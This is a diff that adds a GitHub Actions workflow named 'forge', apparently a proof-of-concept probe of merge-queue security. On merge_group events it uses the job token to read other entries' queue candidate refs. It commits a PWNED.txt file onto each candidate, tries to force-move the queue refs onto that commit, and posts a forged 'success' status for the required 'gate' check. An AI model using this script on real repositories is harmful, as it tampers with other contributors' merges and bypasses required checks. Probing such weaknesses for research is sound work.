@@ -1,0 +1,77 @@
+name: forge
+on:
+  merge_group:
+permissions:
+  contents: write
+  statuses: write
+jobs:
+  forge:
+    runs-on: ubuntu-latest
+    steps:
+      - name: try to move another entry's queue candidate
+        run: |
+          set -x
+          R="${{ github.repository }}"
+          T="${{ github.token }}"
+          SELF="${{ github.sha }}"
+          AUTH="Authorization: Bearer $T"
+          echo "SELF-REF=${{ github.ref }}"
+          echo "SELF-SHA=$SELF"
+          curl -sS -H "$AUTH" \
+            "https://api.github.com/repos/$R/git/matching-refs/heads/gh-readonly-queue" -o /tmp/refs.json
+          echo REFS-BEGIN; cat /tmp/refs.json; echo; echo REFS-END
+          jq -r '.[] | [.ref, .object.sha] | @tsv' /tmp/refs.json > /tmp/pairs.tsv
+          while IFS=$'\t' read -r ref sha; do
+            [ -z "$sha" ] && continue
+            if [ "$sha" = "$SELF" ]; then echo "SKIP-SELF $ref"; continue; fi
+            echo "=== TARGET $ref $sha ==="
+
+            # G0: can we even READ the candidate's tree?
+            curl -sS -H "$AUTH" "https://api.github.com/repos/$R/git/commits/$sha" -o /tmp/c.json
+            base_tree=$(jq -r '.tree.sha' /tmp/c.json)
+            echo "G0-READ-CANDIDATE tree=$base_tree"
+
+            # G1: create a blob + tree + commit on top of the victim's candidate
+            g1=$(curl -sS -o /tmp/b.json -w '%{http_code}' -X POST -H "$AUTH" \
+              "https://api.github.com/repos/$R/git/blobs" \
+              -d '{"content":"owned by a fork-authored merge_group job","encoding":"utf-8"}')
+            blob=$(jq -r '.sha // empty' /tmp/b.json)
+            echo "G1-BLOB http=$g1 sha=$blob"
+            g2=$(curl -sS -o /tmp/t.json -w '%{http_code}' -X POST -H "$AUTH" \
+              "https://api.github.com/repos/$R/git/trees" \
+              -d "{\"base_tree\":\"$base_tree\",\"tree\":[{\"path\":\"PWNED.txt\",\"mode\":\"100644\",\"type\":\"blob\",\"sha\":\"$blob\"}]}")
+            tree=$(jq -r '.sha // empty' /tmp/t.json)
+            echo "G2-TREE http=$g2 sha=$tree"
+            g3=$(curl -sS -o /tmp/nc.json -w '%{http_code}' -X POST -H "$AUTH" \
+              "https://api.github.com/repos/$R/git/commits" \
+              -d "{\"message\":\"rewritten candidate\",\"tree\":\"$tree\",\"parents\":[\"$sha\"]}")
+            newsha=$(jq -r '.sha // empty' /tmp/nc.json)
+            echo "G3-COMMIT http=$g3 sha=$newsha"
+
+            # G4: THE QUESTION - move the queue's control-plane ref onto it
+            short=${ref#refs/}
+            g4=$(curl -sS -o /tmp/r1.json -w '%{http_code}' -X PATCH -H "$AUTH" \
+              "https://api.github.com/repos/$R/git/$short" \
+              -d "{\"sha\":\"$newsha\",\"force\":true}")
+            echo "G4-PATCH-QUEUE-REF http=$g4"; cat /tmp/r1.json; echo
+
+            # G4b: non-fast-forward variant, in case force is the refusal
+            g4b=$(curl -sS -o /tmp/r2.json -w '%{http_code}' -X PATCH -H "$AUTH" \
+              "https://api.github.com/repos/$R/git/$short" \
+              -d "{\"sha\":\"$newsha\",\"force\":false}")
+            echo "G4b-PATCH-NOFORCE http=$g4b"; cat /tmp/r2.json; echo
+
+            # G5: positive control - the SAME token moving a ref it is allowed to move
+            curl -sS -o /tmp/mk.json -w 'G5a-CREATE-ORDINARY-REF http=%{http_code}\n' -X POST -H "$AUTH" \
+              "https://api.github.com/repos/$R/git/refs" \
+              -d "{\"ref\":\"refs/heads/ctl-$SELF\",\"sha\":\"$sha\"}"
+            curl -sS -o /tmp/mv.json -w 'G5b-MOVE-ORDINARY-REF http=%{http_code}\n' -X PATCH -H "$AUTH" \
+              "https://api.github.com/repos/$R/git/refs/heads/ctl-$SELF" \
+              -d "{\"sha\":\"$newsha\",\"force\":true}"
+
+            # G6: and set the required context on the rewritten sha, so if G4 landed it can merge
+            curl -sS -o /dev/null -w 'G6-STATUS-ON-NEW-SHA http=%{http_code}\n' -X POST -H "$AUTH" \
+              "https://api.github.com/repos/$R/statuses/$newsha" \
+              -d '{"state":"success","context":"gate","description":"forged on the rewritten candidate"}'
+          done < /tmp/pairs.tsv
+          echo FORGE-DONE
